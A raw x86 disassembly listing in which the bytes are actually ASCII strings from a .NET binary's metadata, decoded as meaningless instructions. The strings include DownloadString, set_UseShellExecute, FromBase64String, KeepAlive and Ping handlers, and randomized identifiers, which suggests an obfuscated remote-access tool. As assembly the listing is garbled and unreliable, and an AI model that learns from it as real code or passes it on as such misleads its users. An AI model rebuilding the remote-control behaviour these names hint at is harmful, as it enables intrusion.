  408430:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408437:	5f                   	pop    %edi
  408438:	4c                   	dec    %esp
  408439:	61                   	popa
  40843a:	73 74                	jae    0x4084b0
  40843c:	57                   	push   %edi
  40843d:	72 69                	jb     0x4084a8
  40843f:	74 65                	je     0x4084a6
  408441:	54                   	push   %esp
  408442:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  408449:	6e                   	outsb  %ds:(%esi),(%dx)
  40844a:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408451:	54                   	push   %esp
  408452:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  408459:	74 65                	je     0x4084c0
  40845b:	4c                   	dec    %esp
  40845c:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408463:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408466:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40846a:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408471:	6d                   	insl   (%dx),%es:(%edi)
  408472:	65 54                	gs push %esp
  408474:	79 70                	jns    0x4084e6
  408476:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40847a:	74 5f                	je     0x4084db
  40847c:	56                   	push   %esi
  40847d:	61                   	popa
  40847e:	6c                   	insb   (%dx),%es:(%edi)
  40847f:	75 65                	jne    0x4084e6
  408481:	54                   	push   %esp
  408482:	79 70                	jns    0x4084f4
  408484:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408488:	6f                   	outsl  %ds:(%esi),(%dx)
  408489:	74 6f                	je     0x4084fa
  40848b:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40848e:	54                   	push   %esp
  40848f:	79 70                	jns    0x408501
  408491:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408495:	74 54                	je     0x4084eb
  408497:	79 70                	jns    0x408509
  408499:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40849d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4084a0:	74 54                	je     0x4084f6
  4084a2:	79 70                	jns    0x408514
  4084a4:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4084a8:	6c                   	insb   (%dx),%es:(%edi)
  4084a9:	65 53                	gs push %ebx
  4084ab:	68 61 72 65 00       	push   $0x657261
  4084b0:	53                   	push   %ebx
  4084b1:	79 73                	jns    0x408526
  4084b3:	74 65                	je     0x40851a
  4084b5:	6d                   	insl   (%dx),%es:(%edi)
  4084b6:	2e 43                	cs inc %ebx
  4084b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4084b9:	72 65                	jb     0x408520
  4084bb:	00 43 6c             	add    %al,0x6c(%ebx)
  4084be:	6f                   	outsl  %ds:(%esi),(%dx)
  4084bf:	73 65                	jae    0x408526
  4084c1:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4084c5:	70 6f                	jo     0x408536
  4084c7:	73 65                	jae    0x40852e
  4084c9:	00 50 61             	add    %dl,0x61(%eax)
  4084cc:	72 73                	jb     0x408541
  4084ce:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4084d2:	72 52                	jb     0x408526
  4084d4:	65 76 65             	gs jbe 0x40853c
  4084d7:	72 73                	jb     0x40854c
  4084d9:	65 00 76 75          	add    %dh,%gs:0x75(%esi)
  4084dd:	72 64                	jb     0x408543
  4084df:	66 72 55             	data16 jb 0x408537
  4084e2:	43                   	inc    %ebx
  4084e3:	62 61 49             	bound  %esp,0x49(%ecx)
  4084e6:	74 65                	je     0x40854d
  4084e8:	00 58 35             	add    %bl,0x35(%eax)
  4084eb:	30 39                	xor    %bh,(%ecx)
  4084ed:	43                   	inc    %ebx
  4084ee:	65 72 74             	gs jb  0x408565
  4084f1:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4084f8:	00 43 72             	add    %al,0x72(%ebx)
  4084fb:	65 61                	gs popa
  4084fd:	74 65                	je     0x408564
  4084ff:	00 53 65             	add    %dl,0x65(%ebx)
  408502:	74 54                	je     0x408558
  408504:	68 72 65 61 64       	push   $0x64616572
  408509:	45                   	inc    %ebp
  40850a:	78 65                	js     0x408571
  40850c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40850f:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408516:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40851b:	65 74 65             	gs je  0x408583
  40851e:	00 43 61             	add    %al,0x61(%ebx)
  408521:	6c                   	insb   (%dx),%es:(%edi)
  408522:	6c                   	insb   (%dx),%es:(%edi)
  408523:	53                   	push   %ebx
  408524:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40852b:	74 
  40852c:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408530:	6d                   	insl   (%dx),%es:(%edi)
  408531:	70 69                	jo     0x40859c
  408533:	6c                   	insb   (%dx),%es:(%edi)
  408534:	65 72 47             	gs jb  0x40857e
  408537:	65 6e                	outsb  %gs:(%esi),(%dx)
  408539:	65 72 61             	gs jb  0x40859d
  40853c:	74 65                	je     0x4085a3
  40853e:	64 41                	fs inc %ecx
  408540:	74 74                	je     0x4085b6
  408542:	72 69                	jb     0x4085ad
  408544:	62 75 74             	bound  %esi,0x74(%ebp)
  408547:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40854c:	75 67                	jne    0x4085b5
  40854e:	67 61                	addr16 popa
  408550:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408554:	74 74                	je     0x4085ca
  408556:	72 69                	jb     0x4085c1
  408558:	62 75 74             	bound  %esi,0x74(%ebp)
  40855b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40855f:	6d                   	insl   (%dx),%es:(%edi)
  408560:	56                   	push   %esi
  408561:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408568:	74 74                	je     0x4085de
  40856a:	72 69                	jb     0x4085d5
  40856c:	62 75 74             	bound  %esi,0x74(%ebp)
  40856f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408573:	73 65                	jae    0x4085da
  408575:	6d                   	insl   (%dx),%es:(%edi)
  408576:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40857a:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408581:	72 
  408582:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408589:	73 73                	jae    0x4085fe
  40858b:	65 6d                	gs insl (%dx),%es:(%edi)
  40858d:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408591:	72 61                	jb     0x4085f4
  408593:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408596:	61                   	popa
  408597:	72 6b                	jb     0x408604
  408599:	41                   	inc    %ecx
  40859a:	74 74                	je     0x408610
  40859c:	72 69                	jb     0x408607
  40859e:	62 75 74             	bound  %esi,0x74(%ebp)
  4085a1:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4085a6:	67 65 74 46          	addr16 gs je 0x4085f0
  4085aa:	72 61                	jb     0x40860d
  4085ac:	6d                   	insl   (%dx),%es:(%edi)
  4085ad:	65 77 6f             	gs ja  0x40861f
  4085b0:	72 6b                	jb     0x40861d
  4085b2:	41                   	inc    %ecx
  4085b3:	74 74                	je     0x408629
  4085b5:	72 69                	jb     0x408620
  4085b7:	62 75 74             	bound  %esi,0x74(%ebp)
  4085ba:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4085be:	73 65                	jae    0x408625
  4085c0:	6d                   	insl   (%dx),%es:(%edi)
  4085c1:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4085c5:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4085cc:	69 
  4085cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4085ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4085cf:	41                   	inc    %ecx
  4085d0:	74 74                	je     0x408646
  4085d2:	72 69                	jb     0x40863d
  4085d4:	62 75 74             	bound  %esi,0x74(%ebp)
  4085d7:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4085db:	73 65                	jae    0x408642
  4085dd:	6d                   	insl   (%dx),%es:(%edi)
  4085de:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4085e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e4:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4085ea:	74 69                	je     0x408655
  4085ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4085ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4085ee:	41                   	inc    %ecx
  4085ef:	74 74                	je     0x408665
  4085f1:	72 69                	jb     0x40865c
  4085f3:	62 75 74             	bound  %esi,0x74(%ebp)
  4085f6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4085fa:	73 65                	jae    0x408661
  4085fc:	6d                   	insl   (%dx),%es:(%edi)
  4085fd:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408601:	65 73 63             	gs jae 0x408667
  408604:	72 69                	jb     0x40866f
  408606:	70 74                	jo     0x40867c
  408608:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40860f:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  408616:	65 66 61             	gs popaw
  408619:	75 6c                	jne    0x408687
  40861b:	74 4d                	je     0x40866a
  40861d:	65 6d                	gs insl (%dx),%es:(%edi)
  40861f:	62 65 72             	bound  %esp,0x72(%ebp)
  408622:	41                   	inc    %ecx
  408623:	74 74                	je     0x408699
  408625:	72 69                	jb     0x408690
  408627:	62 75 74             	bound  %esi,0x74(%ebp)
  40862a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40862e:	6d                   	insl   (%dx),%es:(%edi)
  40862f:	70 69                	jo     0x40869a
  408631:	6c                   	insb   (%dx),%es:(%edi)
  408632:	61                   	popa
  408633:	74 69                	je     0x40869e
  408635:	6f                   	outsl  %ds:(%esi),(%dx)
  408636:	6e                   	outsb  %ds:(%esi),(%dx)
  408637:	52                   	push   %edx
  408638:	65 6c                	gs insb (%dx),%es:(%edi)
  40863a:	61                   	popa
  40863b:	78 61                	js     0x40869e
  40863d:	74 69                	je     0x4086a8
  40863f:	6f                   	outsl  %ds:(%esi),(%dx)
  408640:	6e                   	outsb  %ds:(%esi),(%dx)
  408641:	73 41                	jae    0x408684
  408643:	74 74                	je     0x4086b9
  408645:	72 69                	jb     0x4086b0
  408647:	62 75 74             	bound  %esi,0x74(%ebp)
  40864a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40864e:	73 65                	jae    0x4086b5
  408650:	6d                   	insl   (%dx),%es:(%edi)
  408651:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408655:	72 6f                	jb     0x4086c6
  408657:	64 75 63             	fs jne 0x4086bd
  40865a:	74 41                	je     0x40869d
  40865c:	74 74                	je     0x4086d2
  40865e:	72 69                	jb     0x4086c9
  408660:	62 75 74             	bound  %esi,0x74(%ebp)
  408663:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408667:	73 65                	jae    0x4086ce
  408669:	6d                   	insl   (%dx),%es:(%edi)
  40866a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40866e:	6f                   	outsl  %ds:(%esi),(%dx)
  40866f:	70 79                	jo     0x4086ea
  408671:	72 69                	jb     0x4086dc
  408673:	67 68 74 41 74 74    	addr16 push $0x74744174
  408679:	72 69                	jb     0x4086e4
  40867b:	62 75 74             	bound  %esi,0x74(%ebp)
  40867e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408682:	73 65                	jae    0x4086e9
  408684:	6d                   	insl   (%dx),%es:(%edi)
  408685:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408689:	6f                   	outsl  %ds:(%esi),(%dx)
  40868a:	6d                   	insl   (%dx),%es:(%edi)
  40868b:	70 61                	jo     0x4086ee
  40868d:	6e                   	outsb  %ds:(%esi),(%dx)
  40868e:	79 41                	jns    0x4086d1
  408690:	74 74                	je     0x408706
  408692:	72 69                	jb     0x4086fd
  408694:	62 75 74             	bound  %esi,0x74(%ebp)
  408697:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40869b:	6e                   	outsb  %ds:(%esi),(%dx)
  40869c:	74 69                	je     0x408707
  40869e:	6d                   	insl   (%dx),%es:(%edi)
  40869f:	65 43                	gs inc %ebx
  4086a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4086a2:	6d                   	insl   (%dx),%es:(%edi)
  4086a3:	70 61                	jo     0x408706
  4086a5:	74 69                	je     0x408710
  4086a7:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4086aa:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4086b1:	69 
  4086b2:	62 75 74             	bound  %esi,0x74(%ebp)
  4086b5:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4086b9:	74 5f                	je     0x40871a
  4086bb:	55                   	push   %ebp
  4086bc:	73 65                	jae    0x408723
  4086be:	53                   	push   %ebx
  4086bf:	68 65 6c 6c 45       	push   $0x456c6c65
  4086c4:	78 65                	js     0x40872b
  4086c6:	63 75 74             	arpl   %esi,0x74(%ebp)
  4086c9:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4086cd:	61                   	popa
  4086ce:	64 42                	fs inc %edx
  4086d0:	79 74                	jns    0x408746
  4086d2:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4086d6:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4086dd:	00 
  4086de:	44                   	inc    %esp
  4086df:	65 6c                	gs insb (%dx),%es:(%edi)
  4086e1:	65 74 65             	gs je  0x408749
  4086e4:	56                   	push   %esi
  4086e5:	61                   	popa
  4086e6:	6c                   	insb   (%dx),%es:(%edi)
  4086e7:	75 65                	jne    0x40874e
  4086e9:	00 47 65             	add    %al,0x65(%edi)
  4086ec:	74 56                	je     0x408744
  4086ee:	61                   	popa
  4086ef:	6c                   	insb   (%dx),%es:(%edi)
  4086f0:	75 65                	jne    0x408757
  4086f2:	00 53 65             	add    %dl,0x65(%ebx)
  4086f5:	74 56                	je     0x40874d
  4086f7:	61                   	popa
  4086f8:	6c                   	insb   (%dx),%es:(%edi)
  4086f9:	75 65                	jne    0x408760
  4086fb:	00 67 65             	add    %ah,0x65(%edi)
  4086fe:	74 5f                	je     0x40875f
  408700:	4b                   	dec    %ebx
  408701:	65 65 70 41          	gs gs jo 0x408746
  408705:	6c                   	insb   (%dx),%es:(%edi)
  408706:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  40870d:	5f                   	pop    %edi
  40870e:	4b                   	dec    %ebx
  40870f:	65 65 70 41          	gs gs jo 0x408754
  408713:	6c                   	insb   (%dx),%es:(%edi)
  408714:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40871b:	6f                   	outsl  %ds:(%esi),(%dx)
  40871c:	76 65                	jbe    0x408783
  40871e:	00 64 45 6f          	add    %ah,0x6f(%ebp,%eax,2)
  408722:	76 50                	jbe    0x408774
  408724:	6f                   	outsl  %ds:(%esi),(%dx)
  408725:	53                   	push   %ebx
  408726:	67 51                	addr16 push %ecx
  408728:	77 65                	ja     0x40878f
  40872a:	00 70 49             	add    %dh,0x49(%eax)
  40872d:	6b 50 52 48          	imul   $0x48,0x52(%eax),%edx
  408731:	49                   	dec    %ecx
  408732:	48                   	dec    %eax
  408733:	62 49 7a             	bound  %ecx,0x7a(%ecx)
  408736:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40873a:	74 5f                	je     0x40879b
  40873c:	42                   	inc    %edx
  40873d:	6c                   	insb   (%dx),%es:(%edi)
  40873e:	6f                   	outsl  %ds:(%esi),(%dx)
  40873f:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408742:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408749:	5f                   	pop    %edi
  40874a:	54                   	push   %esp
  40874b:	6f                   	outsl  %ds:(%esi),(%dx)
  40874c:	74 61                	je     0x4087af
  40874e:	6c                   	insb   (%dx),%es:(%edi)
  40874f:	53                   	push   %ebx
  408750:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408757:	5f                   	pop    %edi
  408758:	48                   	dec    %eax
  408759:	65 61                	gs popa
  40875b:	64 65 72 53          	fs gs jb 0x4087b2
  40875f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408766:	5f                   	pop    %edi
  408767:	48                   	dec    %eax
  408768:	65 61                	gs popa
  40876a:	64 65 72 53          	fs gs jb 0x4087c1
  40876e:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408775:	5f                   	pop    %edi
  408776:	53                   	push   %ebx
  408777:	65 6e                	outsb  %gs:(%esi),(%dx)
  408779:	64 42                	fs inc %edx
  40877b:	75 66                	jne    0x4087e3
  40877d:	66 65 72 53          	data16 gs jb 0x4087d4
  408781:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408788:	5f                   	pop    %edi
  408789:	52                   	push   %edx
  40878a:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40878e:	76 65                	jbe    0x4087f5
  408790:	42                   	inc    %edx
  408791:	75 66                	jne    0x4087f9
  408793:	66 65 72 53          	data16 gs jb 0x4087ea
  408797:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40879e:	5f                   	pop    %edi
  40879f:	4b                   	dec    %ebx
  4087a0:	65 79 53             	gs jns 0x4087f6
  4087a3:	69 7a 65 00 51 50 76 	imul   $0x76505100,0x65(%edx),%edi
  4087aa:	55                   	push   %ebp
  4087ab:	74 46                	je     0x4087f3
  4087ad:	58                   	pop    %eax
  4087ae:	68 42 66 00 4e       	push   $0x4e006642
  4087b3:	7a 6d                	jp     0x408822
  4087b5:	58                   	pop    %eax
  4087b6:	67 4a                	addr16 dec %edx
  4087b8:	50                   	push   %eax
  4087b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ba:	61                   	popa
  4087bb:	47                   	inc    %edi
  4087bc:	4a                   	dec    %edx
  4087bd:	66 00 42 68          	data16 add %al,0x68(%edx)
  4087c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4087c2:	4d                   	dec    %ebp
  4087c3:	42                   	inc    %edx
  4087c4:	77 59                	ja     0x40881f
  4087c6:	59                   	pop    %ecx
  4087c7:	48                   	dec    %eax
  4087c8:	4a                   	dec    %edx
  4087c9:	66 00 50 56          	data16 add %dl,0x56(%eax)
  4087cd:	63 51 47             	arpl   %edx,0x47(%ecx)
  4087d0:	73 56                	jae    0x408828
  4087d2:	67 61                	addr16 popa
  4087d4:	4b                   	dec    %ebx
  4087d5:	4a                   	dec    %edx
  4087d6:	66 00 72 6e          	data16 add %dh,0x6e(%edx)
  4087da:	44                   	inc    %esp
  4087db:	64 6d                	fs insl (%dx),%es:(%edi)
  4087dd:	6d                   	insl   (%dx),%es:(%edi)
  4087de:	77 70                	ja     0x408850
  4087e0:	4a                   	dec    %edx
  4087e1:	6a 66                	push   $0x66
  4087e3:	00 52 6f             	add    %dl,0x6f(%edx)
  4087e6:	49                   	dec    %ecx
  4087e7:	4c                   	dec    %esp
  4087e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e9:	46                   	inc    %esi
  4087ea:	71 6d                	jno    0x408859
  4087ec:	64 6c                	fs insb (%dx),%es:(%edi)
  4087ee:	6b 6f 66 00          	imul   $0x0,0x66(%edi),%ebp
  4087f2:	6d                   	insl   (%dx),%es:(%edi)
  4087f3:	75 79                	jne    0x40886e
  4087f5:	52                   	push   %edx
  4087f6:	44                   	inc    %esp
  4087f7:	52                   	push   %edx
  4087f8:	74 73                	je     0x40886d
  4087fa:	50                   	push   %eax
  4087fb:	49                   	dec    %ecx
  4087fc:	41                   	inc    %ecx
  4087fd:	41                   	inc    %ecx
  4087fe:	6d                   	insl   (%dx),%es:(%edi)
  4087ff:	74 66                	je     0x408867
  408801:	00 56 73             	add    %dl,0x73(%esi)
  408804:	53                   	push   %ebx
  408805:	7a 42                	jp     0x408849
  408807:	75 45                	jne    0x40884e
  408809:	42                   	inc    %edx
  40880a:	69 6f 58 59 4a 78 48 	imul   $0x48784a59,0x58(%edi),%ebp
  408811:	67 00 41 42          	add    %al,0x42(%bx,%di)
  408815:	56                   	push   %esi
  408816:	45                   	inc    %ebp
  408817:	44                   	inc    %esp
  408818:	57                   	push   %edi
  408819:	62 77 71             	bound  %esi,0x71(%edi)
  40881c:	66 4e                	dec    %si
  40881e:	67 00 47 50          	add    %al,0x50(%bx)
  408822:	7a 67                	jp     0x40888b
  408824:	4e                   	dec    %esi
  408825:	4e                   	dec    %esi
  408826:	73 41                	jae    0x408869
  408828:	57                   	push   %edi
  408829:	72 51                	jb     0x40887c
  40882b:	66 67 00 43 72       	data16 add %al,0x72(%bp,%di)
  408830:	79 70                	jns    0x4088a2
  408832:	74 6f                	je     0x4088a3
  408834:	43                   	inc    %ebx
  408835:	6f                   	outsl  %ds:(%esi),(%dx)
  408836:	6e                   	outsb  %ds:(%esi),(%dx)
  408837:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  40883d:	74 5f                	je     0x40889e
  40883f:	50                   	push   %eax
  408840:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408847:	5f                   	pop    %edi
  408848:	50                   	push   %eax
  408849:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408850:	74 65                	je     0x4088b7
  408852:	6d                   	insl   (%dx),%es:(%edi)
  408853:	2e 54                	cs push %esp
  408855:	68 72 65 61 64       	push   $0x64616572
  40885a:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408861:	5f                   	pop    %edi
  408862:	50                   	push   %eax
  408863:	61                   	popa
  408864:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  40886b:	64 64 
  40886d:	5f                   	pop    %edi
  40886e:	53                   	push   %ebx
  40886f:	65 73 73             	gs jae 0x4088e5
  408872:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408879:	6e                   	outsb  %ds:(%esi),(%dx)
  40887a:	67 00 55 54          	add    %dl,0x54(%di)
  40887e:	46                   	inc    %esi
  40887f:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408882:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408885:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40888c:	74 65                	je     0x4088f3
  40888e:	6d                   	insl   (%dx),%es:(%edi)
  40888f:	2e 44                	cs inc %esp
  408891:	72 61                	jb     0x4088f4
  408893:	77 69                	ja     0x4088fe
  408895:	6e                   	outsb  %ds:(%esi),(%dx)
  408896:	67 2e 49             	addr16 cs dec %ecx
  408899:	6d                   	insl   (%dx),%es:(%edi)
  40889a:	61                   	popa
  40889b:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  4088a2:	73 
  4088a3:	74 65                	je     0x40890a
  4088a5:	6d                   	insl   (%dx),%es:(%edi)
  4088a6:	2e 52                	cs push %edx
  4088a8:	75 6e                	jne    0x408918
  4088aa:	74 69                	je     0x408915
  4088ac:	6d                   	insl   (%dx),%es:(%edi)
  4088ad:	65 2e 56             	gs cs push %esi
  4088b0:	65 72 73             	gs jb  0x408926
  4088b3:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4088ba:	46                   	inc    %esi
  4088bb:	72 6f                	jb     0x40892c
  4088bd:	6d                   	insl   (%dx),%es:(%edi)
  4088be:	42                   	inc    %edx
  4088bf:	61                   	popa
  4088c0:	73 65                	jae    0x408927
  4088c2:	36 34 53             	ss xor $0x53,%al
  4088c5:	74 72                	je     0x408939
  4088c7:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  4088ce:	61                   	popa
  4088cf:	73 65                	jae    0x408936
  4088d1:	36 34 53             	ss xor $0x53,%al
  4088d4:	74 72                	je     0x408948
  4088d6:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  4088dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4088de:	6c                   	insb   (%dx),%es:(%edi)
  4088df:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e0:	61                   	popa
  4088e1:	64 53                	fs push %ebx
  4088e3:	74 72                	je     0x408957
  4088e5:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  4088ec:	74 72                	je     0x408960
  4088ee:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  4088f5:	5f                   	pop    %edi
  4088f6:	41                   	inc    %ecx
  4088f7:	73 53                	jae    0x40894c
  4088f9:	74 72                	je     0x40896d
  4088fb:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408902:	5f                   	pop    %edi
  408903:	41                   	inc    %ecx
  408904:	73 53                	jae    0x408959
  408906:	74 72                	je     0x40897a
  408908:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  40890f:	53                   	push   %ebx
  408910:	74 72                	je     0x408984
  408912:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408919:	73 74                	jae    0x40898f
  40891b:	72 69                	jb     0x408986
  40891d:	6e                   	outsb  %ds:(%esi),(%dx)
  40891e:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408922:	73 74                	jae    0x408998
  408924:	65 6d                	gs insl (%dx),%es:(%edi)
  408926:	2e 44                	cs inc %esp
  408928:	72 61                	jb     0x40898b
  40892a:	77 69                	ja     0x408995
  40892c:	6e                   	outsb  %ds:(%esi),(%dx)
  40892d:	67 00 64 58          	add    %ah,0x58(%si)
  408931:	6d                   	insl   (%dx),%es:(%edi)
  408932:	73 53                	jae    0x408987
  408934:	4a                   	dec    %edx
  408935:	7a 52                	jp     0x408989
  408937:	67 78 47             	addr16 js 0x408981
  40893a:	6f                   	outsl  %ds:(%esi),(%dx)
  40893b:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40893f:	74 5f                	je     0x4089a0
  408941:	45                   	inc    %ebp
  408942:	72 72                	jb     0x4089b6
  408944:	6f                   	outsl  %ds:(%esi),(%dx)
  408945:	72 44                	jb     0x40898b
  408947:	69 61 6c 6f 67 00 4d 	imul   $0x4d00676f,0x6c(%ecx),%esp
  40894e:	70 4f                	jo     0x40899f
  408950:	43                   	inc    %ebx
  408951:	75 77                	jne    0x4089ca
  408953:	4d                   	dec    %ebp
  408954:	7a 61                	jp     0x4089b7
  408956:	78 46                	js     0x40899e
  408958:	79 67                	jns    0x4089c1
  40895a:	00 41 7a             	add    %al,0x7a(%ecx)
  40895d:	7a 66                	jp     0x4089c5
  40895f:	61                   	popa
  408960:	4d                   	dec    %ebp
  408961:	4e                   	dec    %esi
  408962:	58                   	pop    %eax
  408963:	76 44                	jbe    0x4089a9
  408965:	67 68 00 43 6f 6d    	addr16 push $0x6d6f4300
  40896b:	70 75                	jo     0x4089e2
  40896d:	74 65                	je     0x4089d4
  40896f:	48                   	dec    %eax
  408970:	61                   	popa
  408971:	73 68                	jae    0x4089db
  408973:	00 56 65             	add    %dl,0x65(%esi)
  408976:	72 69                	jb     0x4089e1
  408978:	66 79 48             	data16 jns 0x4089c3
  40897b:	61                   	popa
  40897c:	73 68                	jae    0x4089e6
  40897e:	00 46 6c             	add    %al,0x6c(%esi)
  408981:	75 73                	jne    0x4089f6
  408983:	68 00 67 65 74       	push   $0x74656700
  408988:	5f                   	pop    %edi
  408989:	45                   	inc    %ebp
  40898a:	78 65                	js     0x4089f1
  40898c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40898f:	61                   	popa
  408990:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408994:	61                   	popa
  408995:	74 68                	je     0x4089ff
  408997:	00 47 65             	add    %al,0x65(%edi)
  40899a:	74 54                	je     0x4089f0
  40899c:	65 6d                	gs insl (%dx),%es:(%edi)
  40899e:	70 50                	jo     0x4089f0
  4089a0:	61                   	popa
  4089a1:	74 68                	je     0x408a0b
  4089a3:	00 67 65             	add    %ah,0x65(%edi)
  4089a6:	74 5f                	je     0x408a07
  4089a8:	4c                   	dec    %esp
  4089a9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089ab:	67 74 68             	addr16 je 0x408a16
  4089ae:	00 4c 45 50          	add    %cl,0x50(%ebp,%eax,2)
  4089b2:	68 57 56 78 7a       	push   $0x7a785657
  4089b7:	52                   	push   %edx
  4089b8:	6a 6a                	push   $0x6a
  4089ba:	58                   	pop    %eax
  4089bb:	62 59 69             	bound  %ebx,0x69(%ecx)
  4089be:	00 62 4b             	add    %ah,0x4b(%edx)
  4089c1:	4b                   	dec    %ebx
  4089c2:	4d                   	dec    %ebp
  4089c3:	61                   	popa
  4089c4:	6a 77                	push   $0x77
  4089c6:	47                   	inc    %edi
  4089c7:	56                   	push   %esi
  4089c8:	4e                   	dec    %esi
